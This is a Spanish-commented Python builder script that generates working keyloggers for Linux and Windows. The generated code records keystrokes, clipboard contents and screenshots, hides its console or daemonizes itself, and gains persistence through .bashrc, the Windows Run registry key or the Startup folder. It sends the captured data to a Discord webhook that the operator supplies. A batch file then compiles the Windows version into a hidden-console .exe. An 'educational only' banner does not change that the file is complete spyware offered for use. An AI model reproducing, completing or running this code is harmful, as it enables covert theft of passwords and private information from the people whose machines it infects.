#!/usr/bin/env python3
"""
BUILDER KEYLOGGER REAL DEFINITIVO - VERSIÓN CORREGIDA
Funciona en Linux y Windows (clipboard y teclas especiales fix)
Genera .bat que funcionan con python -m PyInstaller
"""

import os
import sys
import json
import shutil
from datetime import datetime

class RealKeyloggerBuilder:
    def __init__(self):
        self.clear_screen()
        self.config = {}
        
    def clear_screen(self):
        os.system('clear' if os.name == 'posix' else 'cls')
    
    def show_banner(self):
        banner = """
        ╔══════════════════════════════════════════════════╗
        ║     BUILDER KEYLOGGER - VERSIÓN CORREGIDA        ║
        ║     Fix: .bat con python -m PyInstaller          ║
        ╚══════════════════════════════════════════════════╝
        
        ⚠️  SOLO PARA EDUCACIÓN - LABORATORIOS CONTROLADOS
        """
        print(banner)
    
    def get_user_input(self):
        """Obtiene toda la configuración necesaria"""
        print("\n" + "="*60)
        print("CONFIGURACIÓN DEL PROYECTO")
        print("="*60)
        
        # Nombre de la máquina
        while True:
            machine = input("\n[?] Nombre de la máquina objetivo: ").strip()
            if machine:
                self.config['machine'] = machine
                break
            print("[!] El nombre no puede estar vacío")
        
        # Webhook de Discord
        webhook = input("\n[?] Webhook de Discord (Enter para modo simulación): ").strip()
        self.config['webhook'] = webhook if webhook else "SIMULATION_MODE"
        
        # Plataforma
        print("\n[?] Plataforma:")
        print("  1. Solo Linux (Keylogger REAL)")
        print("  2. Solo Windows (Keylogger REAL CORREGIDO)")
        print("  3. Ambos (recomendado)")
        
        while True:
            choice = input("\n[>] Opción (1-3): ").strip()
            if choice in ['1', '2', '3']:
                self.config['platform'] = choice
                break
            print("[!] Opción inválida")
        
        # Características avanzadas
        print("\n[?] Características avanzadas:")
        self.config['stealth'] = input("   ¿Modo stealth (oculto)? (s/n): ").lower() == 's'
        self.config['persistence'] = input("   ¿Añadir persistencia (auto-inicio)? (s/n): ").lower() == 's'
        self.config['screenshots'] = input("   ¿Capturar screenshots? (s/n): ").lower() == 's'
        self.config['clipboard'] = input("   ¿Capturar portapapeles? (s/n): ").lower() == 's'
        self.config['hide_console'] = input("   ¿Ocultar consola en Windows? (s/n): ").lower() == 's'
        
        # Fecha y autor
        self.config['date'] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        self.config['author'] = os.getenv('USER', 'unknown')
        
        return self.config
    
    def generate_linux_keylogger_real(self):
        """Genera keylogger REAL para Linux"""
        print("\n[+] Generando keylogger REAL para Linux...")
        
        stealth_bool = 'True' if self.config['stealth'] else 'False'
        screenshots_bool = 'True' if self.config['screenshots'] else 'False'
        persistence_bool = 'True' if self.config['persistence'] else 'False'
        clipboard_bool = 'True' if self.config['clipboard'] else 'False'
        
        linux_code = f'''#!/usr/bin/env python3
"""
KEYLOGGER REAL PARA LINUX - {self.config['machine']}
¡CAPTURA TECLAS REALES DEL SISTEMA!
Solo para fines educativos en laboratorios controlados
"""

import os
import sys
import time
import threading
import tempfile
from datetime import datetime

# ============================================
# CONFIGURACIÓN
# ============================================
MACHINE_NAME = "{self.config['machine']}"
WEBHOOK_URL = "{self.config['webhook']}"
STEALTH_MODE = {stealth_bool}
SCREENSHOTS_ENABLED = {screenshots_bool}
PERSISTENCE_ENABLED = {persistence_bool}
CLIPBOARD_ENABLED = {clipboard_bool}

# ============================================
# CLASE PRINCIPAL - KEYLOGGER REAL LINUX
# ============================================
class RealLinuxKeylogger:
    def __init__(self):
        self.running = True
        self.log_buffer = ""
        self.log_file = os.path.join(tempfile.gettempdir(), f".sys_{{os.getpid()}}.log")
        
        if not STEALTH_MODE:
            self.show_banner()
    
    def hide_linux_terminal(self):
        """Oculta la terminal en Linux"""
        if STEALTH_MODE:
            if os.fork() > 0:
                sys.exit(0)
            os.chdir('/')
            sys.stdin.close()
            sys.stdout.close()
            sys.stderr.close()
    
    def show_banner(self):
        """Mostrar banner"""
        print("="*60)
        print("   KEYLOGGER REAL PARA LINUX - CAPTURA ACTIVA")
        print(f"   Máquina: {{MACHINE_NAME}}")
        print("="*60)
    
    def start_keyboard_capture(self):
        """Inicia captura REAL de teclado con pynput"""
        try:
            from pynput import keyboard
            
            def on_press(key):
                try:
                    key_str = self.key_to_string(key)
                    self.log_buffer += key_str
                    
                    with open(self.log_file, "a", encoding="utf-8") as f:
                        timestamp = datetime.now().strftime("%H:%M:%S")
                        f.write(f"[{{timestamp}}] {{key_str}}")
                    
                    if not STEALTH_MODE and len(self.log_buffer) % 20 == 0:
                        print(f"[ACTIVO] Capturando... ({{len(self.log_buffer)}} chars)")
                    
                    if len(self.log_buffer) >= 100:
                        self.send_to_discord()
                        
                except Exception:
                    pass
            
            def key_to_string(self, key):
                try:
                    if hasattr(key, 'char') and key.char:
                        return key.char
                    elif key == keyboard.Key.space:
                        return " "
                    elif key == keyboard.Key.enter:
                        return "\\n"
                    elif key == keyboard.Key.backspace:
                        return "[BACKSPACE]"
                    elif key == keyboard.Key.tab:
                        return "[TAB]"
                    elif key == keyboard.Key.esc:
                        return "[ESC]"
                    else:
                        return f"[{{str(key).replace('Key.', '').upper()}}]"
                except:
                    return "[UNKNOWN]"
            
            self.key_to_string = key_to_string.__get__(self)
            
            self.listener = keyboard.Listener(on_press=on_press)
            self.listener.daemon = True
            self.listener.start()
            
            if not STEALTH_MODE:
                print("[✓] Captura de teclado INICIADA")
            
        except ImportError:
            print("[!] ERROR: pynput no instalado")
            print("[+] Instalar con: pip install pynput")
            sys.exit(1)
    
    def capture_clipboard(self):
        """Captura contenido del portapapeles"""
        if not CLIPBOARD_ENABLED:
            return
        
        try:
            import pyperclip
            
            last_clipboard = ""
            while self.running:
                try:
                    current = pyperclip.paste()
                    if current and current != last_clipboard:
                        timestamp = datetime.now().strftime("%H:%M:%S")
                        clipboard_log = f"[CLIPBOARD {{timestamp}}] {{current[:200]}}"
                        
                        with open(self.log_file, "a", encoding="utf-8") as f:
                            f.write(f"\\n{{clipboard_log}}")
                        
                        self.log_buffer += f"\\n{{clipboard_log}}"
                        last_clipboard = current
                        
                        if not STEALTH_MODE:
                            print(f"[CLIPBOARD] Capturado: {{current[:50]}}...")
                
                except:
                    pass
                
                time.sleep(2)
                
        except ImportError:
            if not STEALTH_MODE:
                print("[!] pyperclip no instalado para clipboard")
    
    def capture_screenshots(self):
        """Captura screenshots periódicos"""
        if not SCREENSHOTS_ENABLED:
            return
        
        try:
            from PIL import ImageGrab
            
            counter = 0
            while self.running:
                counter += 1
                if counter % 5 == 0:
                    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                    filename = os.path.join(tempfile.gettempdir(), f"sc_{{MACHINE_NAME}}_{{timestamp}}.png")
                    
                    screenshot = ImageGrab.grab()
                    screenshot.save(filename, 'PNG')
                    
                    if not STEALTH_MODE:
                        print(f"[SCREENSHOT] {{filename}}")
                
                time.sleep(10)
                
        except ImportError:
            if not STEALTH_MODE:
                print("[!] PIL no instalado para screenshots")
    
    def send_to_discord(self):
        """Envía el buffer a Discord"""
        if not self.log_buffer or WEBHOOK_URL == "SIMULATION_MODE":
            return
        
        try:
            import requests
            
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            
            if len(self.log_buffer) > 1500:
                chunks = [self.log_buffer[i:i+1500] for i in range(0, len(self.log_buffer), 1500)]
                for i, chunk in enumerate(chunks):
                    payload = {{
                        "content": f"**{{MACHINE_NAME}}** - {{timestamp}} ({{i+1}}/{{len(chunks)}})\\n```{{chunk}}```",
                        "username": "Linux Keylogger"
                    }}
                    requests.post(WEBHOOK_URL, json=payload, timeout=3)
            else:
                payload = {{
                    "content": f"**{{MACHINE_NAME}}** - {{timestamp}}\\n```{{self.log_buffer}}```",
                    "username": "Linux Keylogger"
                }}
                requests.post(WEBHOOK_URL, json=payload, timeout=3)
            
            self.log_buffer = ""
            
            if not STEALTH_MODE:
                print("[✓] Datos enviados a Discord")
                
        except Exception:
            if not STEALTH_MODE:
                print("[!] Error enviando a Discord")
    
    def add_persistence(self):
        """Añade persistencia al sistema Linux"""
        if not PERSISTENCE_ENABLED:
            return
        
        try:
            script_path = os.path.abspath(__file__)
            bashrc = os.path.expanduser("~/.bashrc")
            startup_cmd = f"nohup python3 {{script_path}} > /dev/null 2>&1 &"
            
            if os.path.exists(bashrc):
                with open(bashrc, 'a') as f:
                    f.write(f'\\n# Auto-start\\n{{startup_cmd}}\\n')
            
            if not STEALTH_MODE:
                print("[✓] Persistencia configurada")
                
        except Exception:
            pass
    
    def run(self):
        """Ejecuta el keylogger"""
        if STEALTH_MODE:
            self.hide_linux_terminal()
        
        if PERSISTENCE_ENABLED:
            self.add_persistence()
        
        self.start_keyboard_capture()
        
        threads = []
        
        if CLIPBOARD_ENABLED:
            t = threading.Thread(target=self.capture_clipboard)
            t.daemon = True
            t.start()
            threads.append(t)
        
        if SCREENSHOTS_ENABLED:
            t = threading.Thread(target=self.capture_screenshots)
            t.daemon = True
            t.start()
            threads.append(t)
        
        def periodic_send():
            while self.running:
                time.sleep(60)
                if self.log_buffer:
                    self.send_to_discord()
        
        t = threading.Thread(target=periodic_send)
        t.daemon = True
        t.start()
        threads.append(t)
        
        try:
            while self.running:
                time.sleep(1)
        except KeyboardInterrupt:
            if not STEALTH_MODE:
                print("\\n[!] Deteniendo...")
            self.running = False
        
        if self.log_buffer:
            self.send_to_discord()
        
        try:
            if os.path.exists(self.log_file):
                os.remove(self.log_file)
        except:
            pass
        
        if not STEALTH_MODE:
            print("[+] Keylogger detenido")

# ============================================
# EJECUCIÓN
# ============================================
if __name__ == "__main__":
    os.environ["EDUCATIONAL_TEST"] = "true"
    keylogger = RealLinuxKeylogger()
    keylogger.run()
'''
        
        filename = f"linux_real_keylogger_{self.config['machine']}.py"
        with open(filename, 'w', encoding='utf-8') as f:
            f.write(linux_code)
        
        os.system(f'chmod +x {filename}')
        print(f"[✓] Keylogger Linux REAL creado: {filename}")
        return filename
    
    def generate_windows_keylogger_fixed(self):
        """Genera keylogger Windows CORREGIDO (clipboard + teclas especiales)"""
        print("\n[+] Generando keylogger Windows CORREGIDO...")
        
        stealth_bool = 'True' if self.config['stealth'] else 'False'
        screenshots_bool = 'True' if self.config['screenshots'] else 'False'
        persistence_bool = 'True' if self.config['persistence'] else 'False'
        clipboard_bool = 'True' if self.config['clipboard'] else 'False'
        hide_console_bool = 'True' if self.config['hide_console'] else 'False'
        
        windows_code = f'''#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
KEYLOGGER REAL PARA WINDOWS - {self.config['machine']}
VERSIÓN CORREGIDA: Clipboard + Teclas Especiales Fix
"""

import os
import sys
import time
import threading
import tempfile
from datetime import datetime

# ============================================
# CONFIGURACIÓN (EMBEBIDA PARA .EXE)
# ============================================
CONFIG = {{
    "machine": "{self.config['machine']}",
    "webhook": "{self.config['webhook']}",
    "stealth": {stealth_bool},
    "screenshots": {screenshots_bool},
    "persistence": {persistence_bool},
    "clipboard": {clipboard_bool},
    "hide_console": {hide_console_bool}
}}

MACHINE_NAME = CONFIG["machine"]
WEBHOOK_URL = CONFIG["webhook"]
STEALTH_MODE = CONFIG["stealth"]
SCREENSHOTS_ENABLED = CONFIG["screenshots"]
PERSISTENCE_ENABLED = CONFIG["persistence"]
CLIPBOARD_ENABLED = CONFIG["clipboard"]
HIDE_CONSOLE = CONFIG["hide_console"]

# ============================================
# CLASE PRINCIPAL - CORREGIDA
# ============================================
class WindowsKeyloggerFixed:
    def __init__(self):
        self.running = True
        self.log_buffer = ""
        self.temp_dir = tempfile.gettempdir()
        self.log_file = os.path.join(self.temp_dir, f"winlog_{{MACHINE_NAME}}.tmp")
        
        # Mapeo de teclas especiales
        self.key_names = {{
            8: "[BACKSPACE]",
            9: "[TAB]",
            13: "[ENTER]",
            16: "[SHIFT]",
            17: "[CTRL]",
            18: "[ALT]",
            19: "[PAUSE]",
            20: "[CAPSLOCK]",
            27: "[ESC]",
            32: " ",
            33: "[PAGEUP]",
            34: "[PAGEDOWN]",
            35: "[END]",
            36: "[HOME]",
            37: "[LEFT]",
            38: "[UP]",
            39: "[RIGHT]",
            40: "[DOWN]",
            45: "[INSERT]",
            46: "[DELETE]",
            91: "[WIN]",
            92: "[WIN]",
            93: "[MENU]",
            112: "[F1]", 113: "[F2]", 114: "[F3]", 115: "[F4]",
            116: "[F5]", 117: "[F6]", 118: "[F7]", 119: "[F8]",
            120: "[F9]", 121: "[F10]", 122: "[F11]", 123: "[F12]",
            144: "[NUMLOCK]",
            145: "[SCROLLLOCK]",
            186: "[;]",
            187: "[=]",
            188: "[,]",
            189: "[-]",
            190: "[.]",
            191: "[/]",
            192: "[`]",
            219: "[[]",
            220: "[\\]",
            221: "[]]",
            222: "[']",
        }}
        
        # Solo mostrar si es visible
        self._show_initial_info()
    
    def _show_initial_info(self):
        """Muestra info inicial solo si es visible"""
        if not STEALTH_MODE and not HIDE_CONSOLE:
            print("="*60)
            print(f"   KEYLOGGER WINDOWS CORREGIDO - {{MACHINE_NAME}}")
            print("   FIX: Clipboard + Teclas Especiales")
            print("="*60)
            print("[INFO] Iniciando captura educativa...")
    
    def hide_console(self):
        """Oculta la consola en Windows"""
        if HIDE_CONSOLE:
            try:
                import ctypes
                whnd = ctypes.windll.kernel32.GetConsoleWindow()
                if whnd != 0:
                    ctypes.windll.user32.ShowWindow(whnd, 0)
            except:
                pass
    
    def start_keyboard_capture(self):
        """Captura de teclado CORREGIDA para Windows"""
        try:
            import pyHook
            import pythoncom
            
            def on_keyboard_event(event):
                try:
                    timestamp = datetime.now().strftime("%H:%M:%S")
                    
                    # Manejo de teclas especiales
                    if event.Ascii:
                        # Tecla con caracter ASCII
                        if event.Ascii == 8:  # Backspace
                            key = "[BACKSPACE]"
                        elif event.Ascii == 9:  # Tab
                            key = "[TAB]"
                        elif event.Ascii == 13:  # Enter
                            key = "[ENTER]\\n"
                        elif event.Ascii == 27:  # Escape
                            key = "[ESC]"
                        elif event.Ascii == 32:  # Space
                            key = " "
                        else:
                            key = chr(event.Ascii)
                    else:
                        # Tecla sin ASCII (teclas especiales)
                        vk_code = event.KeyID
                        key = self.key_names.get(vk_code, f"[VK:{{vk_code}}]")
                    
                    # Registrar la tecla
                    self.log_buffer += key
                    
                    # Guardar en archivo
                    with open(self.log_file, "a", encoding="utf-8") as f:
                        f.write(f"[{{timestamp}}] {{key}}")
                    
                    # Mostrar en consola para debug (si no está oculta)
                    if not STEALTH_MODE and not HIDE_CONSOLE and len(self.log_buffer) % 20 == 0:
                        print(f"[ACTIVO] Capturando... ({{len(self.log_buffer)}} chars)")
                    
                    # Enviar periódicamente
                    if len(self.log_buffer) >= 100:
                        self._send_to_webhook()
                    
                    return True  # Importante: siempre retornar True
                    
                except Exception:
                    return True
            
            # Crear y configurar el hook
            hm = pyHook.HookManager()
            hm.KeyDown = on_keyboard_event
            hm.HookKeyboard()
            
            if not STEALTH_MODE and not HIDE_CONSOLE:
                print("[✓] Hook de teclado instalado")
                print("[✓] Teclas especiales activadas: Ctrl, Alt, Shift, Win, etc.")
            
            # Mantener el hook activo
            pythoncom.PumpMessages()
            
        except ImportError:
            # Fallback a pynput
            if not STEALTH_MODE and not HIDE_CONSOLE:
                print("[!] pyHook no encontrado, usando pynput...")
            self.start_keyboard_capture_pynput()
    
    def start_keyboard_capture_pynput(self):
        """Alternativa con pynput (funciona mejor para teclas especiales)"""
        try:
            from pynput import keyboard
            import pythoncom
            
            def on_press(key):
                try:
                    key_str = self._key_to_str(key)
                    self.log_buffer += key_str
                    
                    with open(self.log_file, "a", encoding="utf-8") as f:
                        timestamp = datetime.now().strftime("%H:%M:%S")
                        f.write(f"[{{timestamp}}] {{key_str}}")
                    
                    # Enviar periódicamente
                    if len(self.log_buffer) >= 100:
                        self._send_to_webhook()
                        
                except Exception:
                    pass
            
            def _key_to_str(self, key):
                """Convierte tecla pynput a string"""
                try:
                    if hasattr(key, 'char') and key.char:
                        return key.char
                    
                    # Teclas especiales
                    special_keys = {{
                        keyboard.Key.space: " ",
                        keyboard.Key.enter: "[ENTER]\\n",
                        keyboard.Key.backspace: "[BACKSPACE]",
                        keyboard.Key.tab: "[TAB]",
                        keyboard.Key.esc: "[ESC]",
                        keyboard.Key.ctrl_l: "[CTRL]",
                        keyboard.Key.ctrl_r: "[CTRL]",
                        keyboard.Key.alt_l: "[ALT]",
                        keyboard.Key.alt_r: "[ALT]",
                        keyboard.Key.shift_l: "[SHIFT]",
                        keyboard.Key.shift_r: "[SHIFT]",
                        keyboard.Key.cmd_l: "[WIN]",
                        keyboard.Key.cmd_r: "[WIN]",
                        keyboard.Key.up: "[UP]",
                        keyboard.Key.down: "[DOWN]",
                        keyboard.Key.left: "[LEFT]",
                        keyboard.Key.right: "[RIGHT]",
                        keyboard.Key.insert: "[INSERT]",
                        keyboard.Key.delete: "[DELETE]",
                        keyboard.Key.home: "[HOME]",
                        keyboard.Key.end: "[END]",
                        keyboard.Key.page_up: "[PAGEUP]",
                        keyboard.Key.page_down: "[PAGEDOWN]",
                        keyboard.Key.f1: "[F1]", keyboard.Key.f2: "[F2]",
                        keyboard.Key.f3: "[F3]", keyboard.Key.f4: "[F4]",
                        keyboard.Key.f5: "[F5]", keyboard.Key.f6: "[F6]",
                        keyboard.Key.f7: "[F7]", keyboard.Key.f8: "[F8]",
                        keyboard.Key.f9: "[F9]", keyboard.Key.f10: "[F10]",
                        keyboard.Key.f11: "[F11]", keyboard.Key.f12: "[F12]",
                        keyboard.Key.caps_lock: "[CAPSLOCK]",
                        keyboard.Key.num_lock: "[NUMLOCK]",
                        keyboard.Key.scroll_lock: "[SCROLLLOCK]",
                    }}
                    
                    return special_keys.get(key, f"[{{str(key).replace('Key.', '')}}]")
                    
                except:
                    return "[UNKNOWN]"
            
            self._key_to_str = _key_to_str.__get__(self)
            
            # Iniciar listener en thread separado
            listener = keyboard.Listener(on_press=on_press)
            listener.daemon = True
            listener.start()
            
            if not STEALTH_MODE and not HIDE_CONSOLE:
                print("[✓] Captura con pynput iniciada")
            
            # Mantener ejecución
            while self.running:
                pythoncom.PumpWaitingMessages()
                time.sleep(0.01)
                
        except ImportError:
            if not STEALTH_MODE and not HIDE_CONSOLE:
                print("[!] ERROR: Necesitas instalar pynput")
                print("[+] pip install pynput")
            sys.exit(1)
    
    def capture_clipboard_windows(self):
        """Captura del portapapeles en Windows - VERSIÓN FUNCIONAL"""
        if not CLIPBOARD_ENABLED:
            return
        
        last_clipboard = ""
        
        while self.running:
            try:
                import win32clipboard
                
                win32clipboard.OpenClipboard()
                
                try:
                    # Intentar obtener texto
                    if win32clipboard.IsClipboardFormatAvailable(win32clipboard.CF_TEXT):
                        data = win32clipboard.GetClipboardData(win32clipboard.CF_TEXT)
                        
                        # Decodificar según la versión de Python
                        if isinstance(data, bytes):
                            current = data.decode('utf-8', errors='ignore')
                        else:
                            current = str(data)
                        
                        # Verificar si es nuevo contenido
                        if current and current.strip() and current != last_clipboard:
                            timestamp = datetime.now().strftime("%H:%M:%S")
                            clipboard_log = f"\\n[CLIPBOARD {{timestamp}}]\\n{{current[:500]}}\\n"
                            
                            if not STEALTH_MODE and not HIDE_CONSOLE:
                                print(f"[CLIPBOARD] Capturado: {{current[:50]}}...")
                            
                            # Guardar en archivo
                            with open(self.log_file, "a", encoding="utf-8") as f:
                                f.write(clipboard_log)
                            
                            # Añadir al buffer para webhook
                            self.log_buffer += f"\\n[CLIPBOARD] {{current[:200]}}..."
                            last_clipboard = current
                            
                except Exception:
                    pass
                
                finally:
                    win32clipboard.CloseClipboard()
                
            except ImportError:
                if not STEALTH_MODE and not HIDE_CONSOLE:
                    print("[!] win32clipboard no disponible. Instalar:")
                    print("[+] pip install pywin32")
                break
            
            except Exception:
                pass
            
            # Esperar 2 segundos entre verificaciones
            time.sleep(2)
    
    def capture_screenshots_windows(self):
        """Captura screenshots en Windows"""
        if not SCREENSHOTS_ENABLED:
            return
        
        try:
            import pyautogui
            
            counter = 0
            while self.running:
                counter += 1
                if counter % 5 == 0:
                    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                    filename = os.path.join(self.temp_dir, f"sc_{{MACHINE_NAME}}_{{timestamp}}.png")
                    
                    screenshot = pyautogui.screenshot()
                    screenshot.save(filename)
                    
                    if not STEALTH_MODE and not HIDE_CONSOLE:
                        print(f"[SCREENSHOT] {{filename}}")
                
                time.sleep(10)
                
        except ImportError:
            if not STEALTH_MODE and not HIDE_CONSOLE:
                print("[!] pyautogui no instalado para screenshots")
    
    def _save_buffer(self):
        """Guarda buffer en archivo"""
        if not self.log_buffer:
            return
        
        try:
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            with open(self.log_file, "a", encoding="utf-8") as f:
                f.write(f"[{{timestamp}}] BUFFER: {{self.log_buffer[:500]}}\\n")
        except:
            pass
    
    def _send_to_webhook(self):
        """Envía datos a webhook"""
        if not self.log_buffer or WEBHOOK_URL == "SIMULATION_MODE":
            return
        
        try:
            import requests
            
            timestamp = datetime.now().strftime("%Y-%m-d %H:%M:%S")
            
            if len(self.log_buffer) > 1500:
                chunks = [self.log_buffer[i:i+1500] for i in range(0, len(self.log_buffer), 1500)]
                for i, chunk in enumerate(chunks):
                    payload = {{
                        "content": f"**{{MACHINE_NAME}}** - {{timestamp}} ({{i+1}}/{{len(chunks)}})\\n```{{chunk}}```",
                        "username": "Windows Keylogger Fixed"
                    }}
                    requests.post(WEBHOOK_URL, json=payload, timeout=5)
            else:
                payload = {{
                    "content": f"**{{MACHINE_NAME}}** - {{timestamp}}\\n```{{self.log_buffer}}```",
                    "username": "Windows Keylogger Fixed"
                }}
                requests.post(WEBHOOK_URL, json=payload, timeout=5)
            
            self.log_buffer = ""
            
            if not STEALTH_MODE and not HIDE_CONSOLE:
                print("[✓] Datos enviados a Discord")
                
        except Exception:
            if not STEALTH_MODE and not HIDE_CONSOLE:
                print("[!] Error enviando a Discord")
    
    def add_persistence_windows(self):
        """Añade persistencia en Windows"""
        if not PERSISTENCE_ENABLED:
            return
        
        try:
            import winreg
            
            # Obtener ruta actual
            if getattr(sys, 'frozen', False):
                exe_path = sys.executable
            else:
                exe_path = os.path.abspath(__file__)
            
            # Añadir al registro
            key = winreg.HKEY_CURRENT_USER
            subkey = r"Software\\Microsoft\\Windows\\CurrentVersion\\Run"
            
            try:
                reg_key = winreg.OpenKey(key, subkey, 0, winreg.KEY_WRITE)
                winreg.SetValueEx(reg_key, f"{{MACHINE_NAME}}_Monitor", 0, winreg.REG_SZ, exe_path)
                winreg.CloseKey(reg_key)
                
                if not STEALTH_MODE and not HIDE_CONSOLE:
                    print("[✓] Persistencia en registro configurada")
                    
            except:
                # Método alternativo: carpeta Startup
                startup_path = os.path.join(os.getenv('APPDATA'), 
                                          'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
                if os.path.exists(startup_path):
                    bat_path = os.path.join(startup_path, f"{{MACHINE_NAME}}.bat")
                    with open(bat_path, 'w') as f:
                        f.write(f'start /B "" "{{exe_path}}"')
                
                if not STEALTH_MODE and not HIDE_CONSOLE:
                    print("[✓] Persistencia en Startup configurada")
                
        except ImportError:
            pass
    
    def run(self):
        """Ejecuta el keylogger corregido"""
        # Ocultar consola primero
        if HIDE_CONSOLE:
            self.hide_console()
        
        # Configurar persistencia
        if PERSISTENCE_ENABLED:
            self.add_persistence_windows()
        
        # Iniciar captura de teclado en thread
        keyboard_thread = threading.Thread(target=self.start_keyboard_capture)
        keyboard_thread.daemon = True
        keyboard_thread.start()
        
        # Thread para clipboard (si está activado)
        threads = []
        if CLIPBOARD_ENABLED:
            t = threading.Thread(target=self.capture_clipboard_windows)
            t.daemon = True
            t.start()
            threads.append(t)
        
        # Thread para screenshots (si está activado)
        if SCREENSHOTS_ENABLED:
            t = threading.Thread(target=self.capture_screenshots_windows)
            t.daemon = True
            t.start()
            threads.append(t)
        
        # Thread para enviar periódicamente
        def periodic_send():
            while self.running:
                time.sleep(60)
                if self.log_buffer:
                    self._send_to_webhook()
        
        t = threading.Thread(target=periodic_send)
        t.daemon = True
        t.start()
        threads.append(t)
        
        if not STEALTH_MODE and not HIDE_CONSOLE:
            print("[+] Sistema activo. Presiona Ctrl+C para detener.")
        
        try:
            # Mantener el programa ejecutándose
            while self.running:
                time.sleep(1)
                
        except KeyboardInterrupt:
            if not STEALTH_MODE and not HIDE_CONSOLE:
                print("\\n[!] Deteniendo...")
            self.running = False
        
        # Limpiar al salir
        try:
            if os.path.exists(self.log_file):
                os.remove(self.log_file)
        except:
            pass
        
        if not STEALTH_MODE and not HIDE_CONSOLE:
            print("[+] Keylogger detenido")

# ============================================
# ENTRY POINT OPTIMIZADO
# ============================================
def main():
    """Punto de entrada principal"""
    # Marcar como educativo
    os.environ["EDUCATIONAL_PURPOSE"] = "true"
    
    # Ejecutar solo en Windows
    if os.name == 'nt':
        keylogger = WindowsKeyloggerFixed()
        keylogger.run()
    else:
        print("Este programa es solo para Windows")

if __name__ == "__main__":
    main()
'''
        
        filename = f"windows_keylogger_fixed_{self.config['machine']}.py"
        with open(filename, 'w', encoding='utf-8') as f:
            f.write(windows_code)
        
        print(f"[✓] Keylogger Windows CORREGIDO creado: {filename}")
        
        # Crear también un batch file para compilar fácilmente
        self.create_windows_compile_batch_fixed(filename)
        
        return filename
    
    def create_windows_compile_batch_fixed(self, python_file):
        """Crea un archivo .bat CORREGIDO que usa python -m PyInstaller"""
        print(f"[+] Creando batch file CORREGIDO...")
        
        base_name = python_file.replace('.py', '')
        
        bat_content = f'''@echo off
chcp 65001 > nul
cls
echo ========================================
echo  COMPILADOR KEYLOGGER - VERSION CORREGIDA
echo  Usa: python -m PyInstaller (SIEMPRE funciona)
echo ========================================
echo.

cd /d "%~dp0"

echo Verificando Python...
python --version
if errorlevel 1 (
    echo ERROR: Python no encontrado
    pause
    exit /b 1
)

echo.
echo Archivos disponibles:
dir *.py /b
echo.

:menu
echo ========================================
echo            MENU PRINCIPAL
echo ========================================
echo.
echo [1] Instalar TODAS las dependencias
echo [2] Instalar solo pyHook (si falla)
echo [3] Compilar .exe (Consola OCULTA)
echo [4] Compilar .exe (Consola VISIBLE)
echo [5] Compilar .exe con nombre personalizado
echo [6] Salir
echo.
set /p opcion=Seleccione opcion [1-6]: 

if "%opcion%"=="1" goto instalar_todo
if "%opcion%"=="2" goto instalar_pyhook
if "%opcion%"=="3" goto compilar_oculto
if "%opcion%"=="4" goto compilar_visible
if "%opcion%"=="5" goto compilar_personalizado
if "%opcion%"=="6" goto salir
echo Opcion invalida!
pause
goto menu

:instalar_todo
cls
echo ========================================
echo INSTALANDO DEPENDENCIAS COMPLETAS...
echo ========================================
echo.
echo Instalando PyInstaller...
pip install pyinstaller
echo.
echo Instalando dependencias del keylogger...
pip install pyHook pypiwin32 pynput requests pywin32 pyautogui
echo.
echo ¡Todas las dependencias instaladas!
pause
goto menu

:instalar_pyhook
cls
echo ========================================
echo INSTALACION MANUAL DE PYHOOK
echo ========================================
echo.
echo Si "pip install pyHook" falla:
echo.
echo 1. Descargar manualmente de:
echo    https://www.lfd.uci.edu/~gohlke/pythonlibs/#pyhook
echo.
echo 2. Buscar version para tu Python:
echo    Ejemplo para Python 3.12:
echo    pyHook-1.5.1-cp312-cp312-win_amd64.whl
echo.
echo 3. Instalar con:
echo    pip install pyHook-1.5.1-cp312-cp312-win_amd64.whl
echo.
pause
goto menu

:compilar_oculto
cls
echo ========================================
echo COMPILAR .EXE (CONSOLA OCULTA)
echo ========================================
echo.
set /p archivo=Nombre del archivo .py (sin .py): 
echo.
echo Compilando %archivo%.py...
echo ¡USANDO: python -m PyInstaller!
echo.
python -m PyInstaller --onefile --noconsole --clean "%archivo%.py"
echo.
if exist "dist\\%archivo%.exe" (
    echo ¡EXITO! Archivo creado:
    echo dist\\%archivo%.exe
) else (
    echo ERROR: No se pudo crear el .exe
)
pause
goto limpiar

:compilar_visible
cls
echo ========================================
echo COMPILAR .EXE (CONSOLA VISIBLE)
echo ========================================
echo.
set /p archivo=Nombre del archivo .py (sin .py): 
echo.
echo Compilando %archivo%.py...
echo ¡USANDO: python -m PyInstaller!
echo.
python -m PyInstaller --onefile --console --clean "%archivo%.py"
echo.
if exist "dist\\%archivo%.exe" (
    echo ¡EXITO! Archivo creado:
    echo dist\\%archivo%.exe
) else (
    echo ERROR: No se pudo crear el .exe
)
pause
goto limpiar

:compilar_personalizado
cls
echo ========================================
echo COMPILAR CON NOMBRE PERSONALIZADO
echo ========================================
echo.
set /p archivo=Nombre del archivo .py (sin .py): 
echo.
set /p nombre_exe=Nombre para el .exe (sin .exe): 
echo.
echo [1] Consola OCULTA
echo [2] Consola VISIBLE
echo.
set /p tipo_consola=Tipo [1-2]: 

if "%tipo_consola%"=="1" (
    echo Compilando con consola OCULTA...
    python -m PyInstaller --onefile --noconsole --clean --name "%nombre_exe%" "%archivo%.py"
) else (
    echo Compilando con consola VISIBLE...
    python -m PyInstaller --onefile --console --clean --name "%nombre_exe%" "%archivo%.py"
)

echo.
if exist "dist\\%nombre_exe%.exe" (
    echo ¡EXITO! Archivo creado:
    echo dist\\%nombre_exe%.exe
) else (
    echo ERROR: No se pudo crear el .exe
)
pause
goto limpiar

:limpiar
cls
echo ========================================
echo LIMPIEZA DE ARCHIVOS TEMPORALES
echo ========================================
echo.
echo ¿Eliminar carpetas temporales? (S/N)
set /p respuesta=

if /i "%respuesta%"=="S" (
    echo Eliminando archivos temporales...
    rmdir /s /q build 2>nul
    del *.spec 2>nul
    echo ¡Limpieza completada!
) else (
    echo Archivos temporales preservados.
)
pause
goto menu

:salir
cls
echo ========================================
echo       PROCESO FINALIZADO
echo ========================================
echo.
echo Resumen:
echo - Scripts generados correctamente
echo - Para compilar en Windows:
echo   1. Copia los archivos a Windows
echo   2. Ejecuta el .bat como Administrador
echo   3. Usa opcion 3 para compilar oculto
echo.
